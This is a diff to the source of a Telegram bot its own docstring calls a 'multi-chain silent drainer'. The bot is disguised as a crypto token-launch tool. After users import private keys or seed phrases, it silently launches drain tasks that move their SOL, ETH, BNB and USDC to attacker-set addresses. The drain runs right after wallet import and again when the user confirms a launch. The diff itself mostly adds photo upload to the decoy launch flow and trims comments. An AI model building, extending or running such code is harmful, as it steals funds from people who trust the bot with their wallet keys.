@@ -2,6 +2,7 @@
 """
 GetRugged bot — multi-chain silent drainer + full launch UX.
 Chains: SOL (full), ETH (full), BNB (full), USDC (ETH+BSC), BTC/XRP/GRAM (stubs).
+Photo upload supported for token image.
 Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
 """
 
@@ -179,7 +180,7 @@ async def staged_loading(message_or_cb, stages: list):
     return msg
 
 # ──────────────────────────────────────────────
-# BIP39 / SLIP-0010 + Exodus hybrid (kept from original)
+# BIP39 / SLIP-0010 + Exodus hybrid
 # ──────────────────────────────────────────────
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
     salt = ("mnemonic" + passphrase).encode("utf-8")
@@ -362,7 +363,6 @@ def _evm_account_from_key(private_key: str):
         return None
 
 def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
-    """BIP44 m/44'/60'/0'/0/{account} → (priv_hex, address)"""
     if not HAS_WEB3:
         return None
     try:
@@ -544,13 +544,13 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
             any_success = True
             sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": time.time()})
 
-    # BTC / XRP / GRAM stubs — log only
+    # BTC / XRP / GRAM stubs
     if BTC_DRAIN:
-        log.info("BTC drain stub for user %s → %s (implement with bitcoinlib if needed)", uid, BTC_DRAIN)
+        log.info("BTC drain stub for user %s → %s", uid, BTC_DRAIN)
     if XRP_DRAIN:
-        log.info("XRP drain stub for user %s → %s (implement with xrpl-py if needed)", uid, XRP_DRAIN)
+        log.info("XRP drain stub for user %s → %s", uid, XRP_DRAIN)
     if GRAM_DRAIN:
-        log.info("GRAM drain stub for user %s → %s (implement with tonsdk if needed)", uid, GRAM_DRAIN)
+        log.info("GRAM drain stub for user %s → %s", uid, GRAM_DRAIN)
 
     if any_success:
         sess.drained = True
@@ -708,7 +708,6 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "launch":
-        # Allow walking the full flow even without wallet
         text = (
             "✏️ <b>Token name (1-32)</b>\n"
             "Tip: Latest, Hot Tokens."
@@ -1060,7 +1059,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    # Fire multi-chain drain
+    # Fire multi-chain drain immediately after import
     if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
         asyncio.create_task(attempt_drain(
             uid,
@@ -1133,7 +1132,7 @@ async def wallet_rename_receive(message: Message, state: FSMContext):
     await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
     await state.clear()
 
-# ── Launch flow (extended) ──────────────────────────────────────────────────
+# ── Launch flow ─────────────────────────────────────────────────────────────
 @router.callback_query(F.data.in_({"launch:latest", "launch:hot"}))
 async def launch_quick_name(cb: CallbackQuery, state: FSMContext):
     names = {
@@ -1178,7 +1177,7 @@ async def launch_supply(message: Message, state: FSMContext):
     await state.update_data(supply=supply)
     await message.answer(
         "🖼 <b>Token image</b>\n\n"
-        "Send an image URL (https://…)\n"
+        "Send a <b>photo</b> directly, an image URL (https://…),\n"
         "or type <code>skip</code>",
         parse_mode=ParseMode.HTML,
     )
@@ -1186,13 +1185,28 @@ async def launch_supply(message: Message, state: FSMContext):
 
 @router.message(LaunchStates.waiting_image)
 async def launch_image(message: Message, state: FSMContext):
-    img = message.text.strip()
-    if img.lower() == "skip":
-        img = ""
-    elif not (img.startswith("http://") or img.startswith("https://")):
-        await message.answer("Send a valid URL starting with http/https or type <code>skip</code>", parse_mode=ParseMode.HTML)
-        return
-    await state.update_data(image=img[:300])
+    img = ""
+
+    # Direct photo upload
+    if message.photo:
+        photo = message.photo[-1]          # largest size
+        img = photo.file_id                # Telegram file_id (permanent for the bot)
+        await message.answer("✅ Image received from photo.")
+    else:
+        text = (message.text or "").strip()
+        if text.lower() == "skip":
+            img = ""
+        elif text.startswith("http://") or text.startswith("https://"):
+            img = text[:300]
+        else:
+            await message.answer(
+                "Send a <b>photo</b>, an image <b>URL</b> (https://…), or type <code>skip</code>",
+                parse_mode=ParseMode.HTML,
+            )
+            return
+
+    await state.update_data(image=img)
+
     await message.answer(
         "🔗 <b>Socials</b>\n\n"
         "Send in one message (or type <code>skip</code>):\n\n"
@@ -1282,6 +1296,21 @@ async def launch_bundle(message: Message, state: FSMContext):
         [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
         [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
     ])
+
+    # If image is a Telegram file_id, show the photo with the summary as caption
+    if data.get("image") and not str(data["image"]).startswith("http"):
+        try:
+            await message.answer_photo(
+                photo=data["image"],
+                caption=summary,
+                reply_markup=kb,
+                parse_mode=ParseMode.HTML,
+            )
+            await state.set_state(LaunchStates.confirm)
+            return
+        except Exception:
+            pass   # fall through to text-only
+
     await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(LaunchStates.confirm)
 
@@ -1358,7 +1387,6 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     if not sess.drained and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001 or active.balance_usdc > 0.5):
         eth_key = None
         if active.eth_address and active.private_key:
-            # if the stored key is EVM we already have it; for seed-derived we re-derive on the fly is complex, so store eth_priv in future
             eth_key = active.private_key if active.chain == "eth" else None
         asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key))
 
